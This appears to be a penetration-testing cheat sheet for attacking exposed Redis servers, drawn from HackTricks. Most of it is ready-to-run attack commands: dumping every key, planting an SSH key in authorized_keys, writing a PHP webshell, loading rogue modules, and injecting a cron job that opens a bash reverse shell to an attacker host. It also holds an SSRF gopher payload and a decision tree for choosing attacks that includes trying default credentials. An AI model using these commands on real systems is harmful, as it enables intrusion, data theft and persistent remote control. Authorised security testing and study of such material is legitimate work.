https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html?highlight=redis#redis-rce
## Initial Connection

```bash
redis-cli -h <IP>
redis-cli -h <IP> -p 6379
nc -vn <IP> 6379
```

First command to run:
```
info
```
- If you get `-NOAUTH Authentication required.` → you need creds
- Look at the `# Server` section for version, OS, config file path
- Look at `# Keyspace` to see databases with keys

---

## Authentication

```bash
# Interactive
AUTH <password>

# With username (Redis ACL, v6+)
AUTH <username> <password>

# Via CLI
redis-cli -h <IP> -a '<password>'
redis-cli -h <IP> --user <username> -a '<password>'
```

> The default username is `default` when only a password is configured.
> Auth mechanism depends entirely on the redis config file.

---

## Config File

Typically located at:
```
/etc/redis/redis.conf
```
If you have a path to it (e.g. via LFI, SSRF, or a shell):
```bash
wget http://<target>/etc/redis/redis.conf
# or
curl http://<target>/etc/redis/redis.conf -o redis.conf
```
Parse it for: `requirepass`, `bind`, `dir`, `dbfilename`, `aclfile`, `rename-command`

---

## Dumping Databases

```bash
# List all databases with key counts
info
# → look at # Keyspace section

# Switch to a database
select 0     # default db
select 1     # db index 1

# List all keys in current db
keys *

# Get value of a key
get <keyname>

# Get all keys + values (quick dump)
redis-cli -h <IP> --scan | while read key; do echo "$key:"; redis-cli -h <IP> get "$key"; done
```

---

## RCE Methods

### 1. SSH Key Injection
**Requirements:** Redis working dir writable to a `.ssh` folder for a valid user.
Common paths: `/var/lib/redis/.ssh/`, `/root/.ssh/`, `/home/<user>/.ssh/`

```bash
# Generate keypair (no passphrase)
ssh-keygen -t rsa -b 4096 -f ./postman_rsa -N ""

# Pad pubkey with newlines — prevents Redis RDB binary framing from corrupting the file
(echo -e "\n\n"; cat postman_rsa.pub; echo -e "\n\n") > spaced_key.txt

# Import padded key into Redis
cat spaced_key.txt | redis-cli -h <IP> -x set ssh_key

# Point Redis dump dir to target .ssh folder
redis-cli -h <IP> config set dir /var/lib/redis/.ssh

# Set dump filename to authorized_keys
redis-cli -h <IP> config set dbfilename authorized_keys

# Write to disk
redis-cli -h <IP> save

# SSH in
ssh -i postman_rsa redis@<IP>
```

> **Why the newline padding?** Redis RDB format wraps your value in binary headers/checksums.
> The newlines push the actual pubkey onto its own clean line so `sshd` can parse it,
> while ignoring the surrounding binary junk.

---

### 2. PHP Webshell
**Requirements:** Know the web root path. Redis process has write perms to it.

```bash
redis-cli -h <IP>
> config set dir /var/www/html
> config set dbfilename shell.php
> set payload "<?php system($_GET['cmd']); ?>"
> save
```

Then visit: `http://<IP>/shell.php?cmd=id`

Common web roots to try:
```
/var/www/html
/usr/share/nginx/html
/srv/http
/var/www/<sitename>/public
```

---

### 3. Rogue Server (Interactive/Reverse Shell)
**Requirements:** Redis ≤ 5.0.5 (sometimes works on later 5.0.x — worth trying)

**Tool 1 — redis-rogue-server** (no auth):
```bash
git clone https://github.com/n0b0dyCN/redis-rogue-server
./redis-rogue-server.py --rhost <TARGET_IP> --lhost <ATTACKER_IP>
```

**Tool 2 — redis-rce** (supports auth credentials, reuses `exp.so` from Tool 1):
```bash
git clone https://github.com/Ridter/redis-rce
# grab exp.so from redis-rogue-server repo
./redis-rce.py -r <TARGET_IP> -L <ATTACKER_IP> -a '<AUTH_PASS>' -f ./exp.so -v
```

> Both tools abuse the Redis replication protocol to load a rogue module.

---

### 4. Load Redis Module
**Requirements:** Ability to upload a `.so` file to the target (FTP, SMB, writable web dir, etc.)

```bash
# Compile module (or use precompiled exp_lin.so)
# https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
# Precompiled: https://github.com/jas502n/Redis-RCE

# Upload exp_lin.so to target via whatever vector is available

# Connect and load
redis-cli -h <IP>
> MODULE LOAD /path/to/exp_lin.so

# Verify it loaded
> MODULE LIST

# Execute commands
> system.exec "id"
> system.exec "whoami"

# Reverse shell
> system.rev <ATTACKER_IP> 9999

# Cleanup
> MODULE UNLOAD mymodule
```

---

### 5. Crontab Injection
**Requirements:** Redis process can write to cron directories (often requires root-running Redis)

```bash
# Create payload file
echo -e "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\n\n" > payload.txt

# Start listener
nc -lvnp 4444

# Inject via Redis
redis-cli -h <IP> -x set cron < payload.txt
redis-cli -h <IP> config set dir /var/spool/cron/crontabs/   # Debian/Ubuntu
# redis-cli -h <IP> config set dir /var/spool/cron/           # CentOS/RHEL
redis-cli -h <IP> config set dbfilename root
redis-cli -h <IP> save
```

> Wait up to 60 seconds for cron to trigger.

---

### 6. Master-Slave Replication Abuse
Configure the target as a slave of your attacker-controlled Redis instance, then push commands that replicate down:

```bash
# On target
redis-cli -h <TARGET_IP>
> SLAVEOF <ATTACKER_IP> 6379

# On attacker — run your own redis-server, issue commands there
# They replicate to the slave (target)
```

---

### 7. Lua Sandbox Bypass (CVEs)
Redis executes Lua via `EVAL`. Recent CVEs break the sandbox:

| CVE | Affected Versions | Type |
|-----|------------------|------|
| CVE-2025-49844 | < 8.2.2 / 8.0.4 / 7.4.6 / 7.2.11 / 6.2.20 | Use-after-free in Lua parser |
| CVE-2025-46817 | Same | Integer overflow in `unpack()` |
| CVE-2025-46818 | Same | Metatable poisoning → privesc |

```bash
# Basic Lua exec test
redis-cli -h <IP> EVAL "return redis.call('config','get','dir')" 0
```

---

### 8. SSRF → Redis
If you find an SSRF with CRLF injection capability, you can send raw Redis commands through it. Redis reads line-by-line and ignores errors, making it exploitable via HTTP-like interfaces.

```
# SSRF payload (CRLF injected into headers/params)
gopher://<REDIS_IP>:6379/_SET%20ssrf%20test%0D%0ASAVE%0D%0A
```

---

## Template Engine Injection (SSTI + Redis Write)
If Redis has write access to template files used by the app:

```bash
redis-cli -h <IP> config set dir /path/to/templates/
redis-cli -h <IP> config set dbfilename vuln_template.html
redis-cli -h <IP> set tmpl "{{7*7}}"   # test — adapt payload to engine
redis-cli -h <IP> save
```

> Note: Many template engines cache in memory. Overwriting the file may not execute
> until the process restarts or cache expires unless auto-reload is enabled.

---

## Quick Reference — Attack Decision Tree

```
Redis accessible?
├── No auth required?
│   ├── Redis version ≤ 5.0.5?    → Rogue Server (interactive shell)
│   ├── Web root writable?        → PHP Webshell
│   ├── .ssh dir writable?        → SSH Key Injection
│   ├── Cron dir writable?        → Crontab Injection
│   └── Can upload .so file?      → Load Redis Module
└── Auth required?
    ├── Check config file for requirepass
    ├── Try default creds: "" / "" or "default" / ""
    └── If creds obtained → same tree as above
        (redis-rce supports -a flag for authenticated attacks)
```

---

## Useful One-Liners

```bash
# Check if auth required
redis-cli -h <IP> ping

# Dump all keys across all DBs
for db in $(redis-cli -h <IP> info | grep ^db | cut -d: -f1 | tr -d 'db'); do
  echo "=== DB $db ==="; redis-cli -h <IP> select $db; redis-cli -h <IP> keys '*'; done

# Get config (useful for finding dir/dbfilename/requirepass)
redis-cli -h <IP> config get '*'

# Check Redis version
redis-cli -h <IP> info server | grep redis_version
```

---

## References
- HackTricks: https://hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html
- redis-rogue-server: https://github.com/n0b0dyCN/redis-rogue-server
- redis-rce (auth support): https://github.com/Ridter/redis-rce
- RedisModules-ExecuteCommand: https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
- Precompiled exp_lin.so: https://github.com/jas502n/Redis-RCE